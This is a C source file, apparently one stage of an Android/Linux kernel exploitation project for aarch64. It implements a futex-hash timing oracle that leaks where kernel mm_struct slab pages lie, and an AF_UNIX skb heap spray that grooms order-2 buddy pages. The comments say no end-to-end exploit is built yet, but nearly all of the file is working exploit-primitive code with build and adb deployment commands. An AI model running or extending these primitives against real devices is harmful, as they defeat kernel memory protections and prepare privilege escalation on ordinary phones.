/* spray_tracer_probe.c — M2 页级邻接示踪实验（HANDOVER §48.6-3 / RESUME v9 下一步 1）
 *
 * 问题：AF_UNIX skb 喷射的 order-2 页能否以已知 mm 为锚做页级定位？
 * 方法：mm_struct 本身是可被 futex bucket oracle 读出的"示踪粒子"——
 *       fork 产生的 mm slab 页（order-2）落点可由 g2_maxmatch 离线恢复。
 *       在两个示踪 mm 之间做 K 个 skb 喷射，若 buddy 分配流呈线性/确定，
 *       则 slab 页 delta 应满足：d01≈C, d12≈C+K, d23≈d12, d34≈C。
 *
 * 本机结构事实（本轮离线确认，HANDOVER §50）：
 *   - kmalloc 缓存至 8192 为止（slabinfo 实测），kmalloc(16384) 走 kmalloc_large
 *     直接向 buddy 申请 order-2 —— 每个 skb data 恰好一个 order-2 块，无 SLUB 中间层；
 *   - THP 未启用（config + sysfs 双确认），region 触页全是 order-0；
 *   - mm_struct slab: 896B × 18/slab，pagesperslab=4（order-2）；开机 51h 后
 *     仅 12 个空闲对象 —— 40 个 dummy fork 足以强制新 slab 页（向 buddy 申请）。
 *
 * 步骤 i 的动作（fork 示踪子进程之前，均在父进程内核态完成）：
 *   1) fork N_DUMMY 个驻留 dummy（耗尽 mm_cachep freelist，强制新 slab 页）；
 *   2) 若 K>0：从持久 socketpool 发 K 个 16064B 包（每包一个 order-2 data 块，驻留）；
 *   3) fork 示踪子进程：其 mm 在 fork 时分配；子进程跑 v9 同款
 *      扫描+1轮翻转纯度甄别，genuine hit 落盘 /data/local/tmp/ks_tracer<i>.txt
 *      （格式兼容 tools/g2_maxmatch.py），完成后经管道通知父进程，然后 pause() 驻留
 *      （mm 不释放；线程 crowd 保持在线）。
 *
 * 步序 K = {0, 0, 768, 768, 0}（768 × 16KB ≈ 12.6MB 信号；每 socket 受 rmem_max 钳制约
 * 装 12 个 16KB 包 —— 64 socket/步 × 12 ≈ 768，实测值以 meta sprayed 行为准）。
 * 预期 block 数（相邻示踪 slab 页，16KB/块）：
 *   d(i,i+1) = 256(T_i crowd 栈) + 43(dummy 栈+slab) + K_{i+1} + bg ≈ 299 + K_{i+1} + bg
 * run1（K 全 0，因 rmem 钳制 bug 实喷 12/0）作为纯对照归档。
 *
 * 安全边界：纯用户态；无任何错误地址解引用（不构造 fake waiter，不做端到端 PoC）；
 * 全部对象本进程族持有/释放，退出即归零；设备零重启目标（同 v9 口径）。
 *
 * 编译 / 运行（同 e2e_predict_probe）：
 *   python -m ziglang cc -target aarch64-linux-musl -O2 -static -pthread -o live_probe/spray_tracer_probe live_probe/spray_tracer_probe.c
 *   MSYS_NO_PATHCONV=1 adb push live_probe/spray_tracer_probe /data/local/tmp/
 *   adb shell mv /data/local/tmp/spray_tracer_prob /data/local/tmp/spray_tracer_probe 2>/dev/null
 *   adb shell /data/local/tmp/spray_tracer_probe
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <time.h>
#include <errno.h>
#include <linux/futex.h>
#include <inttypes.h>

/* ---- 与 e2e_predict_probe.c 一致的扫描参数 ---- */
#define PAGE          4096
#define REGION_PAGES  65536
#define REGION_SZ     ((size_t)REGION_PAGES * PAGE)
#define WAITERS       256
#define TARGET_ID     128
#define HASHSIZE      2048
#define SCAN_PAGES    32768
#define MAX_HITS      48
#define ROUNDS        1                /* 翻转纯度甄别轮数（e2ep 用 2；示踪场景 1 轮为主） */
#define SETTLE_PAUSE_US  300000
#define SETTLE_RESUME_US 1500000
#define HOT_RATIO     5
#define COLD_RATIO    2
#define SCAN_HOT_MULT (HOT_RATIO * 2)
#define MIN_GENUINE   8                /* 首轮不足时对 ambiguous 补一轮 */

/* ---- M2 示踪参数 ---- */
#define NSTEP         5
static const int STEP_K[NSTEP] = {0, 0, 768, 768, 0};
#define N_DUMMY       40
#define NSOCK         64               /* 每步独立 socketpool */
#define PKTS_CAP      2048             /* 单 socket 喷射上限（实际受 rmem_max 钳制 ~12/个） */
#define PAYLOAD_LEN   16064            /* data alloc = 16384 = order-2（kmalloc_large 直连 buddy） */
#define RCVBUF        (2*1024*1024)

static char payload[PAYLOAD_LEN + 16];
static int step_pool[NSTEP][NSOCK][2];   /* 每步独立 socketpool，全程持有（不中途释放） */
static int pool_ready[NSTEP];
static FILE *meta;
static pid_t dummy_pids[NSTEP * N_DUMMY];
static pid_t tracer_pids[NSTEP];
static int n_dummy_total = 0;
static int done_fd = -1;              /* 父侧读端 */
static volatile int *g_active;        /* 共享：当前活跃示踪槽位；其余 crowd 自暂停 */

static double now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

/* slabinfo 关键行快照（mm_struct / kmalloc-8192）——order-2 消耗的独立交叉验证 */
static void slabinfo_snap(FILE *f, const char *tag)
{
    FILE *s = fopen("/proc/slabinfo", "r");
    char line[512];
    if (!s) return;
    while (fgets(line, sizeof(line), s)) {
        if (!strncmp(line, "mm_struct", 9) || !strncmp(line, "kmalloc-8192", 12))
            fprintf(f, "slab %s %s", tag, line);
    }
    fclose(s);
}

/* ---------------- futex oracle 机械（复用 e2e_predict_probe.c） ---------------- */
static inline uint64_t rdtsc(void) {
    uint64_t v;
    __asm__ volatile("isb" ::: "memory");
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(v));
    __asm__ volatile("isb" ::: "memory");
    return v;
}
static int futex_op(uint32_t *u, int op, uint32_t val, const struct timespec *to) {
    return (int)syscall(SYS_futex, u, op, val, to, NULL, 0);
}
static uint64_t measure1(uint32_t *addr) {
    uint64_t t0 = rdtsc();
    futex_op(addr, FUTEX_WAKE_PRIVATE, 1, NULL);
    return rdtsc() - t0;
}
static uint64_t measure_med(uint32_t *addr, int n) {
    uint64_t s[64];
    if (n > 64) n = 64;
    for (int i = 0; i < n; i++) s[i] = measure1(addr);
    for (int i = 0; i < n; i++)
        for (int j = i + 1; j < n; j++)
            if (s[j] < s[i]) { uint64_t x = s[i]; s[i] = s[j]; s[j] = x; }
    return s[n / 2];
}
static inline uint32_t rol32(uint32_t w, unsigned s) { return (w << s) | (w >> (32 - s)); }
static uint32_t jhash2_4(const uint32_t *k, uint32_t initval) {
    uint32_t a, b, c;
    a = b = c = 0xdeadbeefu + 16u + initval;
    a += k[0]; b += k[1]; c += k[2];
    a -= c; a ^= rol32(c, 4);  c += b;
    b -= a; b ^= rol32(a, 6);  a += c;
    c -= b; c ^= rol32(b, 8);  b += a;
    a -= c; a ^= rol32(c, 16); c += b;
    b -= a; b ^= rol32(a, 19); a += c;
    c -= b; c ^= rol32(b, 4);  b += a;
    a += k[3];
    c ^= b; c -= rol32(b, 14);
    a ^= c; a -= rol32(c, 11);
    b ^= a; b -= rol32(a, 25);
    c ^= b; c -= rol32(b, 16);
    a ^= c; a -= rol32(c, 4);
    b ^= a; b -= rol32(a, 14);
    c ^= b; c -= rol32(b, 24);
    return c;
}
static uint32_t bucket_of(uint64_t va, uint64_t mm) {
    uint32_t k[4];
    k[0] = (uint32_t)mm;
    k[1] = (uint32_t)(mm >> 32);
    k[2] = (uint32_t)(va & ~0xfffULL);
    k[3] = (uint32_t)((va & ~0xfffULL) >> 32);
    return jhash2_4(k, (uint32_t)(va & 0xfff)) & (HASHSIZE - 1);
}

static volatile uint8_t *region;
static volatile uint32_t *inc_futex;
static volatile int g_stop = 0;
static volatile int g_pause = 0;
static int g_slot = -1;               /* 本示踪进程的槽位号 */

static void *waiter_thread(void *arg) {
    int slot = (int)(intptr_t)arg;
    struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
    while (!g_stop) {
        if (g_pause || *g_active != slot) { usleep(20000); continue; }
        futex_op((uint32_t *)inc_futex, FUTEX_WAIT_PRIVATE, *inc_futex, &ts);
        usleep(1000);
    }
    return NULL;
}
static void pause_crowd(void) {
    g_pause = 1;
    futex_op((uint32_t *)inc_futex, FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL);
    usleep(SETTLE_PAUSE_US);
}
static void resume_crowd(void) {
    g_pause = 0;
    usleep(SETTLE_RESUME_US);
}

/* ---- 示踪子进程主体：扫描 + 纯度甄别 + 落盘 + 通知 + 驻留 ---- */
static int tracer_main(int idx, int wfd)
{
    char path[128];
    snprintf(path, sizeof(path), "/data/local/tmp/ks_tracer%d.txt", idx);
    FILE *out = fopen(path, "w");
    if (!out) { perror("tracer fopen"); write(wfd, "F", 1); return 2; }

    region = mmap(NULL, REGION_SZ, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (region == MAP_FAILED) { perror("tracer mmap"); write(wfd, "F", 1); return 2; }
    memset((void *)region, 0, REGION_SZ);
    inc_futex = (volatile uint32_t *)(region + TARGET_ID);
    uint64_t inc = (uint64_t)(uintptr_t)inc_futex;
    fprintf(out, "tracer %d k %d\n", idx, STEP_K[idx]);
    fprintf(out, "region %p\ninc %016" PRIx64 "\n", (void *)region, inc);
    printf("[T%d] region=%p inc=%016" PRIx64 " k=%d\n", idx, (void *)region, inc, STEP_K[idx]);

    pthread_t tids[WAITERS];
    g_slot = idx;
    *g_active = idx;                  /* 其他示踪的 crowd 自暂停（3 s 让其在队 waiter 超时出队） */
    printf("[T%d] activating slot (drain other crowds 3s)\n", idx);
    usleep(3000000);
    for (int i = 0; i < WAITERS; i++)
        if (pthread_create(&tids[i], NULL, waiter_thread, (void *)(intptr_t)idx) != 0) {
            printf("[T%d] pthread_create FAIL %d\n", idx, i);
            fprintf(out, "fail pthread_create %d\n", i);
            g_stop = 1;
            fclose(out);
            write(wfd, "F", 1);
            return 3;
        }
    usleep(500000);

    uint64_t baseline = measure_med((uint32_t *)(region + PAGE), 16);
    uint64_t inc_meas = measure_med((uint32_t *)inc_futex, 16);
    fprintf(out, "baseline %" PRIu64 "\ninc_meas %" PRIu64 "\n", baseline, inc_meas);
    if (inc_meas < baseline * HOT_RATIO) {
        printf("[T%d] FAIL inc not hot\n", idx);
        fprintf(out, "fail inc_not_hot\n");
        g_stop = 1;
        fclose(out);
        write(wfd, "F", 1);
        return 3;
    }

    /* 扫描（stride 与 e2ep/purity 一致） */
    static uint64_t hits[MAX_HITS];
    int nhits = 0, all_hits = 0, scanned = 0;
    for (int i = 1; i < SCAN_PAGES; i++) {
        uint32_t *addr = (uint32_t *)(region + (size_t)i * PAGE + ((i * 8) % PAGE));
        if (addr == (uint32_t *)inc_futex) continue;
        uint64_t t = measure_med(addr, 4);
        scanned++;
        if (t > baseline * SCAN_HOT_MULT) {
            all_hits++;
            if (nhits < MAX_HITS) hits[nhits++] = (uint64_t)(uintptr_t)addr;
        }
    }
    printf("[T%d] scan %d candidates %d hits\n", idx, scanned, all_hits);
    fprintf(out, "scan %d %d\n", scanned, all_hits);
    for (int i = 0; i < nhits; i++)
        fprintf(out, "scanhit %d %016" PRIx64 "\n", i, hits[i]);

    /* 1 轮翻转纯度甄别；genuine 不足时对 ambiguous 补一轮 */
    static uint64_t genuine[MAX_HITS];
    int ngenuine = 0;
    static int verdict_state[MAX_HITS];   /* 2=genuine, 1=ambiguous, 0=contaminated */
    uint32_t *ctrl = (uint32_t *)(region + (size_t)(SCAN_PAGES + 1000) * PAGE + 64);
    for (int r = 0; r < 2; r++) {         /* r=0 首轮全体；r=1 仅补 ambiguous */
        for (int i = 0; i < nhits; i++) {
            if (r == 1 && verdict_state[i] != 1) continue;
            uint32_t *h = (uint32_t *)(uintptr_t)hits[i];
            uint64_t hc, hk, hh, hk2;
            pause_crowd();
            hk = measure1(ctrl); hc = measure1(h);
            resume_crowd();
            hk2 = measure1(ctrl); hh = measure1(h);
            int hot  = (hh > hk2 * HOT_RATIO);
            int cold = (hc <= hk * COLD_RATIO);
            if (r == 0) verdict_state[i] = (hot && cold) ? 2 : (hot || cold) ? 1 : 0;
            else        verdict_state[i] = (hot && cold) ? 2 : 0;
            fprintf(out, "toggle %d %016" PRIx64 " %d %" PRIu64 " %" PRIu64
                         " %" PRIu64 " %" PRIu64 " %d %d\n",
                    i, hits[i], r, hc, hk, hh, hk2, hot, cold);
        }
        ngenuine = 0;
        for (int i = 0; i < nhits; i++) {
            if (verdict_state[i] == 2) genuine[ngenuine++] = hits[i];
            fprintf(out, "verdict %d %016" PRIx64 " %s\n", i, hits[i],
                    verdict_state[i] == 2 ? "genuine" :
                    verdict_state[i] == 1 ? "ambiguous" : "contaminated");
        }
        if (ngenuine >= MIN_GENUINE) break;
    }
    printf("[T%d] SUMMARY genuine=%d of %d\n", idx, ngenuine, nhits);
    fprintf(out, "summary %d %d\n", ngenuine, nhits);
    for (int i = 0; i < ngenuine; i++)
        fprintf(out, "hit %d %016" PRIx64 "\n", i, genuine[i]);
    fflush(out);
    fclose(out);

    /* 通知父进程后驻留：mm 不释放，crowd 保持在线 */
    printf("[T%d] DONE, parking (mm alive)\n", idx);
    if (wfd >= 0) { if (write(wfd, "D", 1) != 1) perror("notify"); }
    while (1) pause();
    return 0;
}

/* ---------------- 父进程：socketpool + 步骤编排 ---------------- */
static int setup_pool(int step)
{
    int (*fds)[2] = step_pool[step];
    for (int i = 0; i < NSOCK; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds[i]) < 0) {
            perror("socketpair");
            for (int k = 0; k < i; k++) { close(fds[k][0]); close(fds[k][1]); }
            return -1;
        }
        setsockopt(fds[i][0], SOL_SOCKET, SO_RCVBUF, (int[]){RCVBUF}, sizeof(int));
        setsockopt(fds[i][1], SOL_SOCKET, SO_RCVBUF, (int[]){RCVBUF}, sizeof(int));
    }
    memset(payload, 0x41, sizeof(payload));
    pool_ready[step] = 1;
    return 0;
}
/* 喷射目标 k 个：逐 socket 装满（EAGAIN 即换下一个）。返回实际驻留手数。 */
static long spray(int step, int k)
{
    int (*fds)[2] = step_pool[step];
    long ok = 0;
    for (int s = 0; s < NSOCK && ok < k; s++) {
        for (int j = 0; j < PKTS_CAP && ok < k; j++) {
            ssize_t r = send(fds[s][0], payload, PAYLOAD_LEN, MSG_DONTWAIT);
            if (r == (ssize_t)PAYLOAD_LEN) ok++;
            else break;               /* 该 socket 满（rmem 钳制），换下一个 */
        }
    }
    return ok;
}
static void kill_all(void)
{
    for (int i = 0; i < n_dummy_total; i++)
        if (dummy_pids[i] > 0) kill(dummy_pids[i], SIGKILL);
    for (int i = 0; i < NSTEP; i++)
        if (tracer_pids[i] > 0) kill(tracer_pids[i], SIGKILL);
}
static void on_term(int sig)
{
    (void)sig;
    kill_all();
    _exit(3);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGINT, on_term);
    signal(SIGTERM, on_term);

    /* 共享 active 槽位：MAP_SHARED 匿名页，父子/示踪间共同可见 */
    g_active = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_active == MAP_FAILED) { perror("mmap g_active"); return 2; }
    *g_active = -1;

    meta = fopen("/data/local/tmp/ks_tracer_meta.txt", "w");
    if (!meta) { perror("meta"); return 2; }
    setvbuf(meta, NULL, _IONBF, 0);

    fprintf(meta, "== M2 tracer experiment (run2, K-target=%d/%d/%d/%d/%d) ==\n",
            STEP_K[0], STEP_K[1], STEP_K[2], STEP_K[3], STEP_K[4]);
    slabinfo_snap(meta, "start");

    int pfd[2];
    if (pipe(pfd) < 0) { perror("pipe"); return 2; }
    done_fd = pfd[0];

    for (int step = 0; step < NSTEP; step++) {
        int K = STEP_K[step];
        fprintf(meta, "step %d begin K=%d t=%.3f\n", step, K, now_ms() / 1000.0);

        /* 1) dummy fork：耗尽 mm_cachep freelist，强制新 slab 页 */
        int d_ok = 0, d_err = 0;
        for (int d = 0; d < N_DUMMY; d++) {
            pid_t p = fork();
            if (p == 0) {
                prctl(PR_SET_PDEATHSIG, SIGKILL);
                for (;;) pause();
                _exit(0);
            }
            if (p < 0) { d_err = errno; perror("fork dummy"); break; }
            dummy_pids[n_dummy_total++] = p;
            d_ok++;
        }
        /* v10.1：记录实测成功数（此前恒写 N_DUMMY，见审核 v010 第 ② 条） */
        fprintf(meta, "step %d dummies_ok %d target %d errno %d t=%.3f\n",
                step, d_ok, N_DUMMY, d_err, now_ms() / 1000.0);
        slabinfo_snap(meta, "postdummy");

        /* 2) skb 喷射（驻留；每步独立 socketpool，全程持有不释放） */
        long sprayed = 0;
        if (K > 0) {
            if (setup_pool(step) < 0) { fprintf(meta, "step %d pool_fail\n", step); return 2; }
            sprayed = spray(step, K);
        }
        fprintf(meta, "step %d sprayed %ld t=%.3f\n", step, sprayed, now_ms() / 1000.0);
        slabinfo_snap(meta, "postspray");

        /* 3) 示踪子进程：mm 在 fork 内核态分配 */
        pid_t tp = fork();
        if (tp == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            close(pfd[0]);
            fclose(meta);                 /* 只读副本，关闭防止误用 */
            tracer_main(step, pfd[1]);
            _exit(0);
        }
        tracer_pids[step] = tp;
        fprintf(meta, "step %d tracerpid %d t=%.3f\n", step, (int)tp, now_ms() / 1000.0);

        /* 等示踪扫描完成（子进程写 1 字节） */
        char c = 0;
        ssize_t rn = read(pfd[0], &c, 1);
        fprintf(meta, "step %d tracerscan %c t=%.3f\n", step, c, now_ms() / 1000.0);
        printf("[parent] step %d done (tracer scan '%c', elapsed) t=%.3f\n",
               step, c, now_ms() / 1000.0);
        if (rn != 1 || c != 'D') {
            printf("[parent] step %d tracer scan FAILED\n", step);
            if (c == 'F') { /* 该步无数据，继续其余步骤 */ }
        }
        /* v10.1：tracer 创建后立即取 slabinfo，直接记录"新 slab 页由谁触发" */
        slabinfo_snap(meta, "posttracer");
        /* dummy/tracer 均驻留：不 wait、不释放（保证 delta 流单调） */
    }

    slabinfo_snap(meta, "end");
    fprintf(meta, "END t=%.3f\n", now_ms() / 1000.0);
    fclose(meta);
    printf("[parent] all steps done, cleaning up (kill dummies+tracers, free spray) ...\n");
    kill_all();
    for (int i = 0; i < NSTEP; i++)
        if (tracer_pids[i] > 0) { pid_t w; do { w = waitpid(tracer_pids[i], NULL, 0); } while (w < 0 && errno == EINTR); }
    for (int i = 0; i < n_dummy_total; i++)
        if (dummy_pids[i] > 0) { pid_t w; do { w = waitpid(dummy_pids[i], NULL, 0); } while (w < 0 && errno == EINTR); }
    for (int s = 0; s < NSTEP; s++) {
        if (!pool_ready[s]) continue;
        for (int i = 0; i < NSOCK; i++) { close(step_pool[s][i][0]); close(step_pool[s][i][1]); }
    }
    printf("[parent] cleanup done. results: /data/local/tmp/ks_tracer{0..4}.txt + ks_tracer_meta.txt\n");
    return 0;
}
